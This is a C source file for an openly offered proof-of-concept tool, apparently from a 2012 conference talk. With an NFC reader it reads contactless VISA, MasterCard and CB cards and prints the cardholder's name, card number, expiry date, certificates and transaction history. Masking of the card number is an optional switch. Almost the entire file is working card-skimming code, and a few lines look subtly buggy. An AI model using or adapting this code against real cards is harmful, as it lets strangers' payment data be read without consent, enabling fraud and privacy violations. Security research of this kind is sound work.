/*

nfc_creditcard_reader by Jose Miguel Esparza (jesparza AT eternal-todo.com)
http://eternal-todo.com

Based on the PoC readnfccc by Renaud Lifchitz (renaud.lifchitz@bt.com)

License: distributed under GPL version 3 (http://www.gnu.org/licenses/gpl.html)

* Introduction:
    "Quick and dirty" proof-of-concept
    Open source tool developped and showed for Hackito Ergo Sum 2012 - "Hacking the NFC credit cards for fun and debit ;)"
    Reads NFC credit card personal data (gender, first name, last name, PAN, expiration date, transaction history...) 

* Requirements:
    libnfc (>= 1.6.0-rc1) and a suitable NFC reader (http://www.libnfc.org/documentation/hardware/compatibility)

* Compilation: 
    $ gcc nfc_creditcard_reader.c -lnfc -o nfc_creditcard_reader

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <nfc/nfc.h>

// Choose whether to mask the PAN or not
#define MASKED 1

#define MAX_FRAME_LEN 300

void show(size_t recvlg, uint8_t *recv) {
	int i;

    for (i=0;i<(int) recvlg;i++) {
        printf("%02x",(unsigned int) recv[i]);
    }
    printf("\n");
}

int main(int argc, char **argv) {
    int aid_found = 0;
	nfc_device* pnd;
    nfc_modulation nm;
    nfc_target ant[1];
    
	uint8_t abtRx[MAX_FRAME_LEN];
	uint8_t abtTx[MAX_FRAME_LEN];
    
	size_t szRx = sizeof(abtRx);
	size_t szTx;

	uint8_t START_14443A[] = {0x4A, 0x01, 0x00}; //InListPassiveTarget
	uint8_t START_14443B[] = {0x4A, 0x01, 0x03, 0x00}; //InListPassiveTarget
	uint8_t SELECT_APP[4][15] = {{0x40,0x01,0x00,0xA4,0x04,0x00,0x07,0xA0,0x00,0x00,0x00,0x03,0x10,0x10,0x00},// InDataExchange VISA
                                {0x40,0x01,0x00,0xA4,0x04,0x00,0x07,0xA0,0x00,0x00,0x00,0x04,0x10,0x10,0x00}, // InDataExchange MasterCard
                                {0x40,0x01,0x00,0xA4,0x04,0x00,0x07,0xA0,0x00,0x00,0x00,0x03,0x20,0x10,0x00}, // InDataExchange VISA Electron
                                {0x40,0x01,0x00,0xA4,0x04,0x00,0x07,0xA0,0x00,0x00,0x00,0x42,0x10,0x10,0x00}}; // InDataExchange CB (Carte Bleu)
	uint8_t READ_RECORD[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x0C, 0x00}; //InDataExchange 
	unsigned char *res, output[50], c, amount[10],msg[100];
	unsigned int i, j, expiry, m, n;
    printf("[-] Connecting...\n");
	pnd = nfc_open(NULL,NULL);
	if (pnd == NULL) {
		printf("[x] Unable to connect to NFC device.\n");
		return(1);
	}

    printf("[+] Connected to NFC reader\n");
    nfc_initiator_init(pnd);

    // Checking card type...
    printf("[-] Looking for known card types...\n");
    memset(&abtRx,255,MAX_FRAME_LEN);
    szRx = sizeof(abtRx);
    int numBytes;
    // 14443A Card
    if (numBytes = pn53x_transceive(pnd, START_14443A, sizeof(START_14443A), abtRx, &szRx, 5000)) {
        if (numBytes > 0){
            printf("[+] 14443A card found!!\n");
        }
        else{
            // 14443B Card
            if (numBytes = pn53x_transceive(pnd, START_14443B, sizeof(START_14443B), abtRx, &szRx, 5000)) {
                if (numBytes > 0){
                    printf("[+] 14443B card found!!\n");
                }
                else{
                    printf("[x] Card not found or not supported!! Supported types: 14443A, 14443B.\n");
                    return(1);    
                }
            }
            else{
                nfc_perror(pnd, "START_14443B");
                return(1);
            }
        }
    }
    else{
        nfc_perror(pnd, "START_14443A");
        return(1);    
    }
    
    // Looking for a valid AID (Application Identifier): VISA, VISA Electron, Mastercard, CB
    printf("[-] Looking for known AIDs (VISA, VISA Electron, Mastercard, CB)...\n");
    memset(&abtRx,255,MAX_FRAME_LEN);
    for (i=0; i<4; i++){
        if (!pn53x_transceive(pnd, SELECT_APP[i], sizeof(SELECT_APP[i]), abtRx, &szRx, NULL)) {
            printf("[x] Error sending command!!\n");
            nfc_perror(pnd, "SELECT_APP_VISA");
            return(1);
        }
        else{
            //show(szRx, abtRx);
            res = abtRx;
            if (*(res+1)==0x6a&&*(res+2)==0x82) {
                // AID not found
                continue;
            }
            else if (*(res+1)==0x6a&&*(res+2)==0x86) {
                printf("[!] Wrong parameters!\n\n");
            }
            else if (*(res+1)==0x6f){
                switch (i){
                    case 0:
                        printf("[+] VISA found!!\n");
                        break;
                    case 1:
                        printf("[+] MASTERCARD found!!\n");
                        break;
                    case 2:
                        printf("[+] VISA ELECTRON found!!\n");
                        break;
                    case 3:
                        printf("[+] CB found!!\n");
                        break;
                }
                printf("\n");
                aid_found = 1;
                break;
            }
        }
    }
    if (!aid_found){
        printf("[x] AID not supported!! Supported AIDs: VISA, VISA ELECTRON, MASTERCARD, CB.\n");
        return(1);
    }
    
    // Looking for data in the records
    memset(&abtRx,255,MAX_FRAME_LEN);
    for (m=12;m<=28;) {
        READ_RECORD[5] = m;
        for (n=0;n<=10;n++) {
            READ_RECORD[4] = n;
            szRx = sizeof(abtRx);
            //printf("\n> Sending READ RECORD...(%2x-%2x)\n",n,m);
            if (!pn53x_transceive(pnd, READ_RECORD, sizeof(READ_RECORD), abtRx, &szRx, NULL)) {
                    nfc_perror(pnd, "READ_RECORD");
                    return(1);
            }
            
            res = abtRx;
            if (*(res+1)==0x6a&& (*(res+2)==0x82 || *(res+2)==0x83)) {
                // File or application not found
                continue;
            }
            else if (*(res+1)==0x6a&&*(res+2)==0x86) {
                // Wrong parameters
                continue;
            }
            else{
                /* Look for cardholder name */
                res = abtRx;
                for (i=0;i<(unsigned int) szRx-1;i++) {
                        if (*res==0x5f&&*(res+1)==0x20) {
                            strncpy(output, res+3, (int) *(res+2));
                            output[(int) *(res+2)]=0;
                            printf("Cardholder name: %s\n",output);			
                        }
                        res++;
                }

                /* Look for PAN & Expiry date */
                res = abtRx;
                for (i=0;i<(unsigned int) szRx-1;i++) {
                    if ((*res==0x4d&&*(res+1)==0x57)||(*res==0x9f&&*(res+1)==0x6b)) {
                        strncpy(output, res+3, 13);
                        output[11]=0;
                        printf("PAN:");
                        
                        for (j=0;j<8;j++) {
                            if (j%2==0) printf(" ");
                            c = output[j];
                            if (MASKED&j>=1&j<=5) {
                                printf("**");
                            }
                            else {
                                printf("%02x",c&0xff);
                            }
                        }
                        printf("\n");
                        expiry = (output[10]+(output[9]<<8)+(output[8]<<16))>>4;
                        printf("Expiration date: %02x/20%02x\n\n",(expiry&0xff),((expiry>>8)&0xff));
                        break;			
                    }
                    res++;
                }       
       
                /* Look for public certificates */
                res = abtRx;
                szRx = sizeof(abtRx);
                for (i=0;i<(unsigned int) szRx-1;i++) {
                    if (*res==0x9f && *(res+1)==0x46 && *(res+2)==0x81) {
                        printf("ICC Public Key Certificate:\n");
                        int k;
                        for (k=4;k<(int)148;k++) {
                            printf("%02x",(unsigned int)*(res+k));
                        }
                        printf("\n\n");
                        break;			
                    }
                    res++;
                }
                
                /* Look for public certificates */
                res = abtRx;
                szRx = sizeof(abtRx);
                for (i=0;i<(unsigned int) szRx-1;i++) {
                    if (*res==0x90 && *(res+1)==0x81 && *(res+2)==0xb0) {
                        printf("Issuer Public Key Certificate:\n");
                        int k;
                        for (k=3;k<(int)173;k++) {
                            printf("%02x",(unsigned int)*(res+k));
                        }
                        printf("\n\n");
                        break;			
                    }
                    res++;
                }     
		
                // Looking for transaction logs
                szRx = sizeof(abtRx);
                if (szRx==18) { // Non-empty transaction
                    //show(szRx, abtRx);
                    res = abtRx;

                    /* Look for date */
                    sprintf(msg,"%02x/%02x/20%02x",res[14],res[13],res[12]);

                    /* Look for transaction type */
                    if (res[15]==0) {
                        sprintf(msg,"%s %s",msg,"Payment");
                    }
                    else if (res[15]==1) {
                        sprintf(msg,"%s %s",msg,"Withdrawal");
                    }
                    
                    /* Look for amount*/
                    sprintf(amount,"%02x%02x%02x",res[3],res[4],res[5]);
                    sprintf(msg,"%s\t%d,%02x€",msg,atoi(amount),res[6]);
                    printf("%s\n",msg);
                }
                memset(&abtRx,255,MAX_FRAME_LEN);
            }
        }
        m += 8;
    }
	nfc_close(pnd);
	return(0);
}